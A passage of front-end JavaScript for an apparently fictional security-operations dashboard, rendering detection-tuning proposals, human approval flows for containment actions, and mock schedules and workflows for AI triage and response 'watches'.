.bq.answered{list-style:none;padding:0;margin:0}
.bq.answered li{display:flex;flex-direction:column;align-items:flex-start;gap:6px;padding:9px 0;border-bottom:1px solid var(--line)}
.bq.answered li:last-child{border-bottom:none}
.bq-a-q{font-size:12.5px;line-height:1.45;color:var(--ink-2);display:flex;gap:6px;align-items:flex-start}
.bq-a-q svg{color:var(--green);flex:0 0 auto;margin-top:2px}`; }
function proposalReview(rv){
  if(!rv) return '';
  if(rv.type==='tuning'){
    const ex=(rv.examples||[]).map(e=>`<tr><td class="mono">${e[0]}</td><td class="mono">${e[1]}</td><td class="mono">${e[2]}</td><td><span class="${e[4]==='risk'?'pr-risky':'pr-benign'}">${e[3]}</span></td></tr>`).join('');
    const afterW=Math.max(3,Math.round((rv.after/rv.before)*100));
    const caveats=(rv.caveats||[]).map(c=>`<li>${c}</li>`).join('');
    return `<div class="pr">
      <div class="pr-sec"><div class="pr-h">${ic('list',13)} Matched alerts <span class="pr-n">sample of ${rv.before.toLocaleString()}/day</span></div>
        <table class="pr-ex"><thead><tr><th>Host</th><th>Process</th><th>Port</th><th>Verdict</th></tr></thead><tbody>${ex}</tbody></table></div>
      <div class="pr-sec"><div class="pr-h">${ic('pulse',13)} Before / after volume</div>
        <div class="pr-vol">
          <div class="pr-vrow"><span class="pr-vl">Now</span><span class="pr-vbar"><i class="b" style="width:100%"></i></span><span class="pr-vv">${rv.before.toLocaleString()}/day</span></div>
          <div class="pr-vrow"><span class="pr-vl">After</span><span class="pr-vbar"><i class="a" style="width:${afterW}%"></i></span><span class="pr-vv">${rv.after.toLocaleString()}/day</span></div>
        </div>
        <div class="pr-fp">${ic('check',12)} Est. <b>${rv.fpReduction}</b> false-positive reduction</div></div>
      ${rv.scope?`<div class="pr-sec"><div class="pr-h">${ic('settings',13)} Exception scope</div><code class="pr-scope">${rv.scope}</code></div>`:''}
      ${caveats?`<div class="pr-sec"><div class="pr-h">${ic('warn',13)} Risk caveats</div><ul class="pr-cav">${caveats}</ul></div>`:''}
      <div class="pr-meta">
        ${rv.monitorWindow?`<span class="pr-chip">${ic('eye',12)} Monitor ${rv.monitorWindow}</span>`:''}
        ${rv.expiration?`<span class="pr-chip">${ic('clock',12)} ${rv.expiration}</span>`:''}
        ${rv.rollback?`<span class="pr-chip ok">${ic('refresh',12)} ${rv.rollback}</span>`:''}
      </div>
    </div>`;
  }
  if(rv.type==='detection'){
    const code=(rv.diff||[]).map(d=>{const m=d[1].match(/^(\|\s*)([\s\S]*)$/);return m?`<div><span class="k">${m[1]}</span>${m[2]}</div>`:`<div>${d[1]}</div>`;}).join('');
    const cav=(rv.blindspots||[]).map(c=>`<li>${c}</li>`).join('');
    return `<div class="pr">
      ${rv.hypothesis?`<div class="pr-sec"><div class="pr-h">${ic('investigation',13)} Detection hypothesis</div><div style="font-size:12px;color:var(--ink-1);line-height:1.5">${rv.hypothesis}</div></div>`:''}
      <div class="pr-sec"><div class="pr-h">${ic('terminal',13)} Rule logic <span class="pr-n">${rv.lang||'ES|QL'}</span></div>
        <div class="pr-code">${code}</div></div>
      <div class="pr-sec"><div class="pr-h">${ic('pulse',13)} Backtest <span class="pr-n">${rv.backtestWindow||'90 days'}</span></div>
        <div class="pr-bt">
          <div class="bt"><span class="bt-v">${rv.matches}</span><span class="bt-k">${rv.matches===1?'true match':'true matches'}</span></div>
          <div class="bt"><span class="bt-v green">${rv.fpRate}</span><span class="bt-k">est. false-positive rate</span></div>
          <div class="bt"><span class="bt-v green">${rv.expectedVol}</span><span class="bt-k">expected alerts/wk</span></div>
        </div></div>
      ${cav?`<div class="pr-sec"><div class="pr-h">${ic('warn',13)} Known blind spots</div><ul class="pr-cav">${cav}</ul></div>`:''}
      <div class="pr-meta">
        ${rv.coverage?`<span class="pr-chip">${ic('target',12)} ${rv.coverage}</span>`:''}
        <span class="pr-chip">${ic('eye',12)} 7-day post-deploy monitoring</span>
        <span class="pr-chip ok">${ic('refresh',12)} Versioned — disable or revert anytime</span>
      </div>
    </div>`;
  }
  return '';
}
function cardState(id){ if(!state.cards) state.cards={}; if(!state.cards[id]) state.cards[id]={pending:null, done:{}, allow:{}}; if(!state.cards[id].allow) state.cards[id].allow={}; return state.cards[id]; }
/* ---- Two-person approval state for critical containment (Scenario 4) ---- */
function approvalsBlock(t,action,idx){
  const cs=cardState(t.id); if(!cs.second) cs.second={};
  const ap=PEOPLE[action.twoPerson]||PEOPLE.maya;
  const mine = cs.secondWait===idx || cs.second[idx];
  const st = cs.second[idx] ? `<span class="apprv-st ok">${ic('check',11)} approved</span>`
    : cs.secondWait===idx ? `<span class="apprv-st wait"><span class="rad-spin"></span> requested — waiting</span>`
    : `<span class="apprv-st">asked after you approve</span>`;
  return `<div class="apprv"><div class="apprv-k">${ic('users',12)} Requires two approvals — critical containment</div>
    <div class="apprv-row">${avatar('you')}<span><b>You</b> · Senior Analyst</span>${mine?`<span class="apprv-st ok">${ic('check',11)} approved</span>`:`<span class="apprv-st">approves with the button below</span>`}</div>
    <div class="apprv-row">${avatar(action.twoPerson)}<span><b>${ap.name}</b> · IR lead</span>${st}</div>
  </div>`;
}
function briefProposal(t, action, idx){
  const mode=t.mode||'dayshift';
  const role = mode==='nightshift' ? 'SRE on-call' : 'Senior Analyst';
  const tone = action.tone || (mode==='nightshift'?'act':'danger');
  const pic = action.icon==='lock' ? 'lock' : (action.icon||'lock');
  const sub = action.sub || t.recordId || '';
  const cta = action.cta || 'Confirm';
  const rows = action.blast || [[pic, action.confirm]];
  const cs=cardState(t.id); const allowOn = !!cs.allow[idx];
  let blast=''; rows.forEach(b=>{ blast+=`<div class="br"><span class="bi">${ic(b[0],14)}</span><span>${b[1]}</span>${b[2]==='ok'?`<span class="ok">${ic('check',12)} safe</span>`:''}</div>`; });
  const isReview=!!action.review;
  return `<div class="proposal ${tone} rad-prop">
    <div class="prop-h"><span class="pic" style="background:${tone==='danger'?'var(--red)':'var(--amber)'}">${ic(pic,15)}</span>
      <div><div class="pt">${action.label}</div>${sub?`<div class="ps mono">${sub}</div>`:''}</div>
      <span class="ribbon">${action.twoPerson?'action · 2 approvals':(isReview?'review · confirm':'action · confirm')}</span></div>
    <div class="prop-body">
      ${proposalReview(action.review)}
      <div class="field"><div class="fl">${isReview?'What changes':'Blast radius'}</div><div class="blast">${blast}</div></div>
      <div class="permline"><span class="pl-ic">${ic('shield',14)}</span> <span><b>You</b> — ${role} — ${action.permNote||'this action is permitted'}</span></div>
    </div>
    ${action.twoPerson?approvalsBlock(t,action,idx):`<div class="allowrow"><span class="cb ${allowOn?'on':''}" onclick="event.stopPropagation();App.cardAllow('${t.id}',${idx})">${ic('check',12)}</span><span>Always allow <b>${action.label.toLowerCase()}</b> in this case — stop asking</span></div>`}
    <div class="prop-actions">
      <button class="btn ${tone==='danger'?'danger':'warn'}" ${cs.secondWait===idx?'disabled style="opacity:.55;pointer-events:none"':''} onclick="event.stopPropagation();App.cardConfirm('${t.id}',${idx})">${ic(pic,15)} ${cs.secondWait===idx?'Waiting for second approval…':(action.twoPerson?'Approve — 1 of 2':cta)}</button>
      <button class="btn ghost" onclick="event.stopPropagation();App.cardCancel('${t.id}')">Cancel</button>
    </div>
  </div>`;
}
/* ---- Gated action confirm shown as a right-side flyout over the brief ---- */
function openActionFlyout(id, idx){
  const t = state.threads[id]; const a = ((AI_RADAR[id]||{}).actions||[])[idx];
  if(!t || !a) return;
  state.actionFlyout = { id, idx };
  const body = document.querySelector('#homeView .body'); if(!body) return;
  closeActionFlyoutDom();
  body.appendChild(el('<div class="act-fly-backdrop" id="actFlyBackdrop" onclick="App.closeActionFlyout()"></div>'));
  body.appendChild(el(`<div class="act-fly" id="actionFlyout"><div class="act-fly-card">${briefProposal(t, a, idx)}</div></div>`));
}
function closeActionFlyoutDom(){
  const f = document.getElementById('actionFlyout'); if(f) f.remove();
  const b = document.getElementById('actFlyBackdrop'); if(b) b.remove();
}
function refreshActionFlyout(){
  if(!state.actionFlyout) return false;
  const { id, idx } = state.actionFlyout;
  const t = state.threads[id]; const a = ((AI_RADAR[id]||{}).actions||[])[idx];
  const card = document.querySelector('#actionFlyout .act-fly-card');
  if(card && t && a){ card.innerHTML = briefProposal(t, a, idx); return true; }
  return false;
}
/* ---- Recommended-action confirm (record/flyout) — same blast-radius popover as the chat ---- */
function openRecActionPopover(kind){
  closeRecActionPopoverDom();
  const body = document.querySelector('#homeView .body'); if(!body) return;
  state.recActionKind = kind;
  body.appendChild(el('<div class="act-fly-backdrop" id="recActBackdrop" onclick="App.closeRecAction()"></div>'));
  body.appendChild(el(`<div class="act-fly" id="recActPopover"><div class="act-fly-card">${actionCard({kind})}</div></div>`));
}
function closeRecActionPopoverDom(){
  const f = document.getElementById('recActPopover'); if(f) f.remove();
  const b = document.getElementById('recActBackdrop'); if(b) b.remove();
}
/* ---- Recommended-action confirm expanded INLINE under the clicked action (no separate popover) ---- */
function removeRecActionInline(){
  document.querySelectorAll('.brec-inline').forEach(n=>n.remove());
  document.querySelectorAll('.brec-btn.expanded').forEach(b=>b.classList.remove('expanded'));
}
function toggleRecActionInline(kind, ev){
  const btn = ev && (ev.currentTarget || (ev.target && ev.target.closest && ev.target.closest('.brec-btn')));
  const open = btn && document.querySelector('.brec-inline');
  const wasSameOpen = open && btn.nextElementSibling && btn.nextElementSibling.classList.contains('brec-inline');
  removeRecActionInline();
  if(wasSameOpen || !btn){ state.recActionKind=null; return; }
  state.recActionKind = kind;
  btn.classList.add('expanded');
  btn.insertAdjacentElement('afterend', el(`<div class="brec-inline">${actionCard({kind})}</div>`));
}
function closeCardMore(){ const m=document.getElementById('cardMorePop'); if(m) m.remove(); document.removeEventListener('mousedown',cardMoreClose); document.removeEventListener('scroll',cardMoreScrollClose,true); }
function cardMoreClose(e){ const m=document.getElementById('cardMorePop'); if(m && !m.contains(e.target)) closeCardMore(); }
/* review fix 3 — the More menu is fixed-position: close it the moment anything scrolls so it never detaches from its card */
function cardMoreScrollClose(e){ const m=document.getElementById('cardMorePop'); if(m && e && e.target && m.contains(e.target)) return; closeCardMore(); }
function radarActionRowInner(t, compact){
  const ai=AI_RADAR[t.id]||{}; const acts=ai.actions||[];
  const cs=cardState(t.id);
  const chatBtn=`<button class="rad-chat icon-only" title="Open in chat" aria-label="Open in chat" onclick="event.stopPropagation();App.openThread('${t.id}')">${ic('comment',15)}</button>`;
  if(!acts.length) return `<div class="rad-act-btns">${watchRowHTML(t)}${chatBtn}</div>`;
  let dones='';
  acts.forEach((a,i)=>{ if(cs.done[i]) dones+=`<div class="rad-done-line">${ic('check',13)} <span>${a.done}</span></div>`; });
  // A gated action mid-confirm replaces the button row with the full blast-radius proposal (same as chat).
  if(cs.pending!=null && acts[cs.pending]){
    return `${dones}${briefProposal(t, acts[cs.pending], cs.pending)}`;
  }
  let btns='';
  const order=acts.map((a,i)=>i).sort((x,y)=>(acts[y].gated?1:0)-(acts[x].gated?1:0));
  const live=order.filter(i=>!cs.done[i]);
  const cap = compact ? 1 : live.length;
  const show = live.slice(0, cap);
  const hidden = live.slice(cap);
  show.forEach(i=>{
    const a=acts[i];
    btns+=`<button class="rad-act${a.gated?' gated':''}" onclick="event.stopPropagation();App.cardAct('${t.id}',${i})">${ic(a.gated?'lock':(a.icon||'bolt'),12)} ${a.label}</button>`;
  });
  const moreBtn = `<button class="rad-act rad-act-more" title="More actions" onclick="event.stopPropagation();App.cardMore('${t.id}',this)">${ic('dots',15)}</button>`;
  const actDiv = `<span class="rad-act-div" aria-hidden="true"></span>`;
  return `<div class="rad-act-btns">${watchRowHTML(t)}${btns}${moreBtn}${actDiv}${chatBtn}</div>${dones}`;
}
function radarActionCard(t, feat, compact){
  const m=TYPE_META[t.type]||{}; const ai=AI_RADAR[t.id]||{score:0,note:''};
  const prio=radarPrio(ai.score);
  const hot=(t.severity==='High'||t.severity==='Critical');
  const sc= hot ? 'var(--red)' : radarSevColor(t);
  const tagCls = hot ? 'crit' : prio.cls;
  const idTag=t.recordId?`<span class="rad-id">${t.recordId}</span>`:'';
  const sevTag=t.severity?`<span class="rad-sevlabel ${tagCls}">${t.severity} severity</span>`:'';
  const chips=(ai.chips||[]).map(c=>`<span class="rad-chip">${c}</span>`).join('');
  return `<div class="rad-item rad-card${feat?' rad-feat-card':''}${compact?' rad-compact-card':''}${hot?' rad-hot':''}" style="--sev:${sc}" id="radcard-${t.id}" onclick="App.openRecord('${t.id}')">
    <div class="rad-hdr">
      ${feat?`<span class="rad-feat-tag">${ic('sparkle',12)} Top priority</span>`:`<span class="rad-tag ${tagCls}">${prio.label}</span>`}
      ${sevTag}
      ${ai.score?radarGauge(ai.score, (feat||hot)?'crit':prio.cls, feat):''}
    </div>
    <div class="rad-item-main">
      <span class="rad-ic" style="--tc:${sc}">${ic(m.icon||'layers',16)}</span>
      <div class="rad-body">
        <div class="rad-titlerow"><span class="rad-title${feat?' rad-feat-title':''}">${t.title}</span>${idTag}</div>
        <div class="rad-ai">${ai.note}</div>
      </div>
      ${t.updated?`<span class="rad-when">${t.updated}</span>`:''}
    </div>
    <div class="rad-acts" id="acts-${t.id}" onclick="event.stopPropagation()">${radarActionRowInner(t)}</div>
  </div>`;
}
/* ---- Proposal card, grouped by decision type (confidence · impact · evidence · assets · action) ---- */
function radarDecisionCard(t, feat){
  const m=TYPE_META[t.type]||{}; const ai=AI_RADAR[t.id]||{score:0,note:''};
  const dec=decisionOf(t); const dm=DECISION_META[dec]||{};
  const hot=(t.severity==='High'||t.severity==='Critical');
  const sc= hot ? 'var(--red)' : radarSevColor(t);
  const sevCls = hot ? 'crit' : radarPrio(ai.score).cls;
  const inMotion = t.status==='in-progress';
  const idTag=t.recordId?`<span class="rad-id">${t.recordId}</span>`:'';
  const sevTag=t.severity?`<span class="rad-sevlabel ${sevCls}">${t.severity} severity</span>`:'';
  const decPill=`<span class="rad-dec" style="--dec:${dm.color}">${ic(dm.icon||'layers',12)} ${dm.label}</span>`;
  const motionTag = inMotion ? `<span class="rad-cnt-motion rad-card-motion" title="NotDaybreak is executing — no decision needed"><span class="rad-spin"></span>In motion${ai.progress!=null?` · ${ai.progress}%`:''}</span>` : '';
  const chips=(ai.chips||[]).slice(0,5).map(c=>`<span class="rad-chip">${c}</span>`).join('');
  const compact=!feat;
  return `<div class="rad-item rad-card${feat?' rad-feat-card':''}${compact?' rad-compact-card':''}${hot?' rad-hot':''}${(state.inspectorOpen&&state.activeId===t.id)?' sel':''}" style="--sev:${dm.color}" id="radcard-${t.id}" onclick="App.openRecord('${t.id}')">
    <div class="rad-hdr">
      ${decPill}${motionTag}${sevTag}
      ${ai.score?radarGauge(ai.score, (feat||hot)?'crit':sevCls, feat, dm.color):''}
    </div>
    <div class="rad-item-main">
      <span class="rad-ic" style="--tc:${dm.color}">${ic(m.icon||'layers',16)}</span>
      <div class="rad-body">
        <div class="rad-titlerow"><span class="rad-title${feat?' rad-feat-title':''}">${t.title}</span>${idTag}</div>
        <div class="rad-ai">${ai.note}</div>
        ${chips?`<div class="rad-assets">${chips}</div>`:''}
      </div>
      ${t.updated?`<span class="rad-when">${t.updated}</span>`:''}
    </div>
    <div class="rad-acts" id="acts-${t.id}" onclick="event.stopPropagation()">${radarActionRowInner(t)}</div>
  </div>`;
}
/* ---- Condensed proposal: score badge + title + one-line why + the single primary move ---- */
/* ============================================================
   WATCHES — the configurable unit of NotDaybreak / NightShift.
   NotDaybreak and NightShift are surfaces, not agents: each watch is a
   managed workflow that runs agents over its slice of the data, on
   its own schedule, with its own autonomy, skills and scope. */
const WATCHES=[
  {id:'floor', name:'Watch Floor', color:'#16b3a6', icon:'alert', on:true,
   mandate:'Frontline triage', surfaces:['dayshift','nightshift'],
   desc:'Triages everything new on both surfaces — investigates alerts and events, dedupes noise, drafts cases for review. Never acts on its own.',
   window:'Always on', cadence:'Streaming — every new alert & event', handoff:'Escalates to Watch Officer',
   sched:{set:true,mode:'always',from:8,to:18,onDemand:false,cadence:'stream',every:60,handoff:'officer'},
   scope:'Security indices · APM · logs',
   scopes:[['Security indices','full','Read'],['APM · logs · SLOs','full','Read'],['Finance PII','masked','Masked']],
   skills:['Alert triage','Case assembly','SLO review'],
   runs:'309',acc:'87%',saved:'22h',last:'2m ago',coverage:[[0,24]],
   recent:[
     {time:'09:21',src:'Alert triage',act:'draft',what:'Drafted a case — mailbox exfil rule on r.patel',out:'Awaiting review'},
     {time:'09:20',src:'Noise suppression',act:'auto',what:'Auto-closed 47 duplicate scanner alerts',out:'Resolved autonomously'},
     {time:'08:48',src:'Alert triage',act:'read',what:'Read DS replication events on FIN-WS-09',out:'Auto-run'}
   ]},
  {id:'officer', name:'Watch Officer', color:'var(--blue)', icon:'siren', on:true,
   mandate:'Escalation & briefs', surfaces:['dayshift','nightshift'],
   desc:'Owns what needs a human — escalates criticals, pages on-call, assembles the shift briefs, and proposes response actions for approval.',
   window:'Always on', cadence:'Event-driven · briefs at 06:00 & 00:00', handoff:'Pages on-call for criticals',
   sched:{set:true,mode:'always',from:8,to:18,onDemand:false,cadence:'stream',every:60,handoff:'oncall'},
   scope:'Open threads · on-call · deploys',
   scopes:[['Open threads · cases','full','Read'],['On-call schedule','full','Read'],['Deploy history','full','Read']],
   skills:['Brief generation','Case assembly','Alert triage'],
   runs:'58',acc:'81%',saved:'9h',last:'08:50',coverage:[[0,24]],
   recent:[
     {time:'08:50',src:'Critical escalation',act:'gated',what:'Proposed isolate FIN-WS-09',out:'Awaiting your review'},
     {time:'06:00',src:'Morning brief',act:'draft',what:'Drafted the shift brief',out:'Delivered'},
     {time:'02:41',src:'Rollback proposals',act:'gated',what:'Escalated the NightShift rollback proposal',out:'Held for your review'}
   ]},
  {id:'dark', name:'Dark Watch', color:'var(--amber)', icon:'bolt', on:true,
   mandate:'Overnight autonomous response', surfaces:['dayshift','nightshift'],
   desc:'Covers the hours nobody’s on. Acts on allow-listed containment — mailbox rules, brute-force blocks — every action reversible and audited, receipts filed to the morning brief.',
   window:'22:00 – 06:00', cadence:'Streaming while on duty', handoff:'Receipts to the morning brief',
   sched:{set:true,mode:'window',from:22,to:6,onDemand:false,cadence:'stream',every:60,handoff:'brief'},
   scope:'Mail · IdP · edge / VPN',
   scopes:[['Mail · IdP','full','Read + act'],['Edge / VPN','full','Read + act'],['Customer data','denied','No access']],
   skills:['Alert triage','Case assembly','Brief generation'],
   runs:'31',acc:'97%',saved:'9h',last:'05:45',coverage:[[22,24],[0,6]],
   recent:[
     {time:'05:45',src:'Morning hand-off',act:'draft',what:'Filed 2 receipts to the morning brief',out:'Delivered'},
     {time:'04:47',src:'Edge brute-force',act:'auto',what:'Blocked VPN brute-force range · CASE-2044',out:'Resolved autonomously'},
     {time:'03:12',src:'Mailbox rules',act:'auto',what:'Removed exfil forwarding rule · CASE-2043',out:'Resolved autonomously'}
   ]},
  {id:'deep', name:'Deep Watch', color:'var(--violet)', icon:'terminal', on:true,
   mandate:'Deep investigation & hunts', surfaces:['dayshift'],
   desc:'Long-running investigations and hypothesis hunts — powers the Deep Watch workbench, drafts findings, and proposes detection tuning.',
   window:'08:00 – 18:00 + on demand', cadence:'Weekly hunts · manual sessions', handoff:'Findings to Records',
   sched:{set:true,mode:'window',from:8,to:18,onDemand:true,cadence:'manual',every:60,handoff:'records'},
   scope:'Security indices · EDR · DNS',
   scopes:[['Security indices','full','Read'],['EDR telemetry','full','Read'],['DNS · netflow','full','Read']],
   skills:['Threat hunt (TTP)','Case assembly','Detection tuning'],
   runs:'46',acc:'83%',saved:'8h',last:'09:09',coverage:[[8,18]],
   recent:[
     {time:'09:09',src:'Manual session',act:'read',what:'Pulled process lineage for FIN-DB-02',out:'Auto-run'},
     {time:'Mon 10:00',src:'Hypothesis hunts',act:'draft',what:'Completed hunt: LOLBins in CI/CD',out:'Findings filed'}
   ]},
  {id:'fraud', name:'Fraud signals', color:'var(--ink-4)', icon:'sparkle', on:false, draft:true,
   mandate:'Risk & fraud', surfaces:['dayshift'],
   desc:'Draft — watches transaction and session streams for velocity anomalies and account-takeover patterns. Finish scoping to activate.',
   window:'—', cadence:'Not scheduled', handoff:'—',
   sched:{set:false,mode:'window',from:9,to:17,onDemand:false,cadence:'stream',every:60,handoff:'none'},
   scope:'Transactions · sessions',
   scopes:[['Transactions','full','Read'],['Sessions','masked','Masked']],
   skills:['Alert triage'],
   runs:null,acc:null,saved:null,last:null,coverage:[],
   recent:[]}
];
/* ============================================================
   WORKFLOWS — a first-class library. A workflow is defined once
   (trigger → skill → outcome) and assigned to one or more watches;
   it runs under each assigned watch's schedule, autonomy and scope. */
const WORKFLOWS=[
  {id:'wf-triage',name:'Alert triage',tt:'event',trig:'On alert · any severity',skill:'Alert triage',out:'Proposes a case',on:true,last:'09:21',watches:['floor']},
  {id:'wf-noise',name:'Noise suppression',tt:'event',trig:'On duplicate · known FPs',skill:'Alert triage',out:'Auto-closes duplicates',on:true,last:'25m ago',watches:['floor']},
  {id:'wf-slo',name:'SLO regression review',tt:'sched',trig:'Schedule · hourly',skill:'SLO review',out:'Flags regressions, drafts findings',surface:'nightshift',on:true,last:'09:00',watches:['floor']},
  {id:'wf-critical',name:'Critical escalation',tt:'event',trig:'On alert · severity = critical',skill:'Alert triage',out:'Pages on-call, proposes response',gated:true,on:true,last:'08:50',watches:['officer']},
  {id:'wf-brief-am',name:'Morning brief',tt:'sched',trig:'Schedule · 06:00 daily',skill:'Brief generation',out:'Drafts the shift brief',surface:'dayshift',on:true,last:'today 06:00',watches:['officer']},
  {id:'wf-brief-night',name:'Overnight brief',tt:'sched',trig:'Schedule · 00:00 daily',skill:'Brief generation',out:'Drafts the overnight brief',surface:'nightshift',on:true,last:'today 00:00',watches:['officer']},
  {id:'wf-rollback',name:'Rollback proposals',tt:'event',trig:'On deploy · error-budget burn',skill:'Case assembly',out:'Proposes a rollback',gated:true,surface:'nightshift',on:true,last:'02:41',watches:['officer']},
  {id:'wf-mailbox',name:'Mailbox rules',tt:'event',trig:'On change · New-InboxRule',skill:'Alert triage',out:'Removes exfil rules · allow-listed',on:true,last:'03:12',watches:['dark']},
  {id:'wf-edge',name:'Edge brute-force',tt:'event',trig:'On spray · botnet-listed IPs',skill:'Alert triage',out:'Blocks the range · allow-listed',on:true,last:'04:47',watches:['dark']},
  {id:'wf-handoff',name:'Morning hand-off',tt:'sched',trig:'Schedule · 05:45 daily',skill:'Brief generation',out:'Files receipts to the brief',on:true,last:'today 05:45',watches:['dark']},
  {id:'wf-hunts',name:'Hypothesis hunts',tt:'sched',trig:'Schedule · weekly + on demand',skill:'Threat hunt (TTP)',out:'Drafts findings to Records',on:true,last:'Mon 10:00',watches:['deep']},
  {id:'wf-beacon',name:'Beacon watch',tt:'event',trig:'On beacon · low-reputation domain',skill:'Threat hunt (TTP)',out:'Snooze + add to watchlist',on:false,last:'—',watches:['deep','dark']},
  {id:'wf-anomtx',name:'Anomalous transactions',tt:'event',trig:'On pattern · velocity anomaly',skill:'Alert triage',out:'Proposes a review',on:false,last:'—',watches:['fraud']},
  {id:'wf-cost',name:'Cost anomaly sweep',tt:'sched',trig:'Schedule · weekly',skill:'SLO review',out:'Flags spend regressions, drafts findings',on:false,last:'—',watches:[]},
];
const watchWorkflows=w=>WORKFLOWS.filter(f=>(f.watches||[]).includes(w.id));
const WATCH_LIST = WATCHES.slice(0,4).map(w=>({name:w.name,color:w.color}));
const WATCH_BY_NAME = {}; WATCHES.forEach(w=>{ WATCH_BY_NAME[w.name]=w; });
/* ---- schedule: w.sched is the single source of truth. The display strings
   (w.window / w.cadence / w.handoff) and the 24h coverage segments all derive
   from it, so the detail form, the watch cards, the coverage strip and the
   autonomy popover can never disagree. */
const SCHED_HANDOFF_OPTS=[
  ['officer','Escalates to Watch Officer','Unfinished or out-of-mandate work lands in Watch Officer’s queue.'],
  ['oncall','Pages on-call for criticals','Criticals page the on-call rotation directly — everything else waits for review.'],
  ['brief','Receipts to the morning brief','Actions taken are filed as receipts into the 06:00 brief.'],
  ['records','Findings to Records','Session output is filed to Records for later review.'],
  ['none','No hand-off','Open work stays in this watch’s queue until someone picks it up.']
];
const SCHED_CADENCE_OPTS=[
  ['stream','Streaming','Reacts to every new event as it lands.'],
  ['sweep','Interval sweeps','Batches new work and sweeps on a fixed interval.'],
  ['manual','Manual sessions','Runs only when an analyst starts a session.']
];
const SCHED_EVERY_OPTS=[[15,'15 min'],[30,'30 min'],[60,'hour'],[360,'6 hours']];
const schedHH=n=>String(((n%24)+24)%24).padStart(2,'0')+':00';
function applySched(w){
  const s=w.sched; if(!s) return;
  if(!s.set){ w.window='—'; w.cadence='Not scheduled'; w.handoff='—'; w.coverage=[]; return; }
  if(s.mode==='always'){ w.window='Always on'; w.coverage=[[0,24]]; }
  else if(s.mode==='window'){
    w.window=schedHH(s.from)+' – '+schedHH(s.to)+(s.onDemand?' + on demand':'');
    w.coverage=s.from<s.to?[[s.from,s.to]]:s.from>s.to?[[s.from,24],[0,s.to]]:[[0,24]];
  }
  else { w.window='On demand only'; w.coverage=[]; }
  w.cadence=s.cadence==='stream'?(s.mode==='window'?'Streaming while on duty':'Streaming — every new alert & event')
    :s.cadence==='sweep'?('Sweeps every '+(SCHED_EVERY_OPTS.find(e=>e[0]===s.every)||SCHED_EVERY_OPTS[2])[1]+(s.mode==='window'?' while on duty':''))
    :'Manual sessions';
  w.handoff=(SCHED_HANDOFF_OPTS.find(h=>h[0]===s.handoff)||SCHED_HANDOFF_OPTS[4])[1];
}
WATCHES.forEach(applySched);
const WATCH_OF={'day-auto1':['Dark Watch'],'day-auto2':['Dark Watch'],'day-r3':['Watch Officer'],'day-r5':['Watch Officer','Watch Floor'],'day-r6':['Watch Officer'],'day-r7':['Watch Officer'],'day-r8':['Watch Floor'],'day-r4':['Watch Floor'],'day-r2':['Deep Watch'],'day-m1':['Watch Officer'],'day-m2':['Watch Officer'],'day-w1':['Deep Watch'],'day-w2':['Watch Floor'],'day-w3':['Watch Floor'],'night-1':['Watch Officer'],'night-r1':['Watch Officer'],'night-r4':['Watch Officer'],'night-r5':['Watch Floor'],'night-r6':['Watch Officer'],'night-r7':['Watch Floor'],'night-m1':['Watch Floor'],'night-m2':['Watch Floor']};
function namedWatches(names){ return (names||[]).map(n=>WATCH_LIST.find(w=>w.name===n)).filter(Boolean); }
function watchFor(id){ return namedWatches(WATCH_OF[id])[0] || WATCH_LIST[0]; }
function watchesFor(id){ const a=namedWatches(WATCH_OF[id]); return a.length?a:[WATCH_LIST[0]]; }
function watchChip(w){ return `<span class="rad-watchtag" style="--wc:${w.color}" title="Tracked by ${w.name} — open watch settings" onclick="event.stopPropagation();App.openWatchName('${w.name}')"><span class="rad-watchtag-dot"></span>${w.name}</span>`; }
function watchRowHTML(t){
  if(!['contain','escalate','investigate','tune'].includes(decisionOf(t))) return '';
  return `<span class="rad-watchacts"><span class="rad-watchacts-k">Watched by</span>${watchesFor(t.id).map(watchChip).join('')}</span>`;
}
/* slim stepped progress bar + step checklist — shown in the record flyout for in-motion work */
function radProgressBar(ai){
  const n=ai.stepsTotal||(ai.steps||[]).length||0;
  const notches = n>1 ? Array.from({length:n-1},(_,i)=>`<span class="rad-prg-notch" style="left:${(((i+1)/n)*100).toFixed(2)}%"></span>`).join('') : '';
  return `<div class="rad-prg" role="progressbar" aria-valuenow="${ai.progress}" aria-valuemin="0" aria-valuemax="100" aria-label="${ai.progressLabel||'Progress'}">
    <div class="rad-prg-track">${notches}<div class="rad-prg-fill" style="width:${ai.progress}%"><span class="rad-prg-head"></span></div></div>
  </div>`;
}
function inspProgressSection(t){
  const ai=AI_RADAR[t.id]||{};
  const steps=ai.steps||[];
  if(t.status!=='in-progress' || (ai.progress==null && !steps.length)) return '';
  const col=(DECISION_META[decisionOf(t)]||{}).color||'#B5850C';
  const rows=steps.map(s=>{
    const st=s.state||'todo';
    const icn = st==='done' ? ic('check',11) : st==='run' ? '<span class="rad-spin ipg-spin"></span>' : '';
    return `<li class="ist ${st}"><span class="ist-ic">${icn}</span><span class="ist-l">${s.label}</span>${s.t?`<span class="ist-t">${s.t}</span>`:''}</li>`;
  }).join('');
  return `<section class="bsec insp-prog-sec" style="--sev:${col}">
    <div class="bsec-h">
      <div class="bf-status"><h4>Progress</h4><span class="rad-spin ipg-spin"></span><span class="bf-fresh">${ai.progressLabel||'Running'}</span></div>
      ${ai.progress!=null?`<div class="bf-tools"><span class="ipg-pct">${ai.progress}%</span></div>`:''}
    </div>
    ${ai.progress!=null?radProgressBar(ai):''}
    ${rows?`<ol class="ipg-steps">${rows}</ol>`:''}
  </section>`;
}
function radarMiniCard(t){
  const ai=AI_RADAR[t.id]||{score:0,note:''};
  const hot=(t.severity==='High'||t.severity==='Critical');
  const sc= hot ? 'var(--red)' : radarSevColor(t);
  const dm = DECISION_META[decisionOf(t)] || {};
  const accent = dm.color || sc;
  const idTag=t.recordId?`<span class="rad-id">${t.recordId}</span>`:'';
  const inMotion = t.status==='in-progress';
  const motionTag = inMotion ? `<span class="rad-cnt-motion rad-card-motion" title="NotDaybreak is executing — no decision needed"><span class="rad-spin"></span>In motion${ai.progress!=null?` · ${ai.progress}%`:''}</span>` : '';
  const score = ai.score ? `<span class="rad-mini-score">${ai.score}</span>` : '';
  return `<div class="rad-mini${(state.inspectorOpen&&state.activeId===t.id)?' sel':''}" data-sev="${(t.severity||'').toLowerCase()}" style="--sev:${accent}" id="radcard-${t.id}" onclick="App.openRecord('${t.id}')">
    <div class="rad-mini-head">
      ${score}
      <div class="rad-mini-titlewrap">
        <div class="rad-mini-titlerow"><span class="rad-mini-title">${t.title}</span>${idTag}${motionTag}</div>
        ${ai.note?`<div class="rad-mini-note">${ai.note}</div>`:''}
      </div>
      ${(t.updated)?`<span class="rad-mini-when">${t.updated}</span>`:''}
